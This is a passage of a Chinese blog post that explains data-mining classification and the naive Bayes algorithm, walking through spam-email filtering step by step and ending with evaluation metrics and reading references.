<p>数据挖掘，就是提取或者挖掘数据，主要通过对已获得的大量数据进行深度整理和分析，其分析结果可以反映过去结果和预测未来趋势。目前几种典型的数据挖掘研究有：关联规则、分类、聚类、预测、web挖掘等。分类挖掘可以从数据中提取相关特征，然后建立相应模型或者函数，并把数据中的每个对象归类到特定分类。例如: 可以检测邮件是否为垃圾邮件，检测数据是否为攻击数据，样本是否为恶意程序等等这些都可以通过分类挖掘实现，而分类挖掘中又分为决策树方法、统计学方法、贝叶斯网络、神经网络等其他分类技术。</p>

<p><strong>2、朴素贝叶斯算法</strong></p>

<p>贝叶斯分类是一种基于统计学的分类方法，就是大学学的概率统计神马的。朴素贝叶斯算法是在贝叶斯算法上基于独立假设的贝叶斯定理的简单概率分类器，因此这里谈到技术的就是数据挖掘中很小的一部分了。其主要基本思路如下：</p>

<p>需求分析&mdash;&mdash;>提取特征&mdash;&mdash;->训练样本&mdash;&mdash;&ndash;>检测特征&mdash;&mdash;->计算后验概率&mdash;&mdash;>判定</p>

<p>首先是需求分析，我们需要清楚自己的目的：即对这些数据分析能够得出什么结果？我们需要什么结果？一个分类模型；还是其他。例如：我们需要对大量的邮件进行分析处理，最终需要建立一个模型能够自动判定一封邮件是够为垃圾邮件或者正常邮件，因此，最终我们只有两个类别，即垃圾邮件、正常邮件。这就是我们的需要。</p>

<p>其次是提取特征，需要对待分析的数据进行详细分析，提取不同点。例如，我们需要研究正常邮件与垃圾邮件有哪些方面的不同，垃圾邮件具有哪些特性，而正常邮件具有额外的哪些特性。一般来讲，垃圾邮件内容中往往含有图片、链接、邮件头、多个收件人、HTML标签问题等比较特殊的特征，而正常邮件一般没有这些特征。</p>

<p>再次是训练样本，这个步骤一般是提取大量样本按照其上一步提取的特征值进行分析并统计，得到一个比较详细的特征统计表。例如：随机从邮件服务器中提取1000封邮件，然后对每封邮件内容按照前面提到的特征进行统计分析。</p>

<p>再次是检测特征，通过前面的过程我们已经建立了一个朴素贝叶斯模型，我们可以通过编写代码实现自动检测特征。例如，可以通过python或者c++实现文本的特征匹配，这里可以采用其他文本匹配算法。</p>

<p>再次是计算后验概率，根据朴素贝叶斯算法，可以计算在已知分类情况下的特征概率，即先验概率。例如，我们可以计算在假定为正常邮件情况下，文本特征有：图片、链接、多个收件人的情况下概率P(图片|垃圾邮件)、P(链接|垃圾邮件)等，然后我们在计算假定为垃圾邮件情况下，文本特征有图片、链接、多个收件人的情况下概率P(图片|正常邮件)、P(链接|正常邮件)等.</p>

<p>最后，我们可以通过比较先验概率的值和概率来判定该样本属于哪种类型。例如：分别计算P（垃圾邮件）<em>P(图片|垃圾邮件)</em>P(链接|垃圾邮件)<em>&hellip;.与P（正常邮件）</em>P(图片|正常邮件)<em>P(链接|正常邮件)</em>&hellip;.，然后看那个值比较大，从而判定属于这个类别。</p>

<p>系统性能指标一般会通过正确率、准确率、召回率这三个指标进行评定。</p>

<p><strong>3、总结</strong></p>

<p>整体来说，整个过程还是比较复杂，特别是样本特征方面，需要考虑比较周全然后其效果才会更加明显，而训练样本的值也会影响最终结果。网上也有一个比较简单的实例，python实现的Naive Bayes[文献3]，大伙可以参考。附带几篇比较好的文章。</p>

<p><strong>4、参考资料</strong></p>

<p>（1）范明.范宏建《数据挖掘导论》</p>

<p>（2）焦李成.《智能数据挖掘与知识发现》</p>

<p>（3）<a href="http://www.coder4.com/archives/1511">Naive Bayes的Python实现</a></p>

<p>（4）<a href="http://www.cnblogs.com/phinecos/archive/2008/10/21/1315948.html">基于朴素贝叶斯分类器的文本分类算法（上）</a></p>

<p>（5）<a href="http://www.ruanyifeng.com/blog/2011/08/bayesian_inference_part_one.html">贝叶斯推断及其互联网应用（一）：定理简介</a></p>

<p>（6）<a href="http://www.ruanyifeng.com/blog/2011/08/bayesian_inference_part_two.html">贝叶斯推断及其互联网应用（二）：过滤垃圾邮件</a></p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/8">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/6">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
    <h1>分类目录</h1>
    <ul>
        <li>
            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
        </li>
    </ul>
</section><section>
    <h1>友情链接</h1>
    <ul>
        <li><a href="http://ohroot.com/" target="_blank">Direwolf</a></li>
        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
    </ul>
</section>
  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - ourren -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  











</body>
</html>
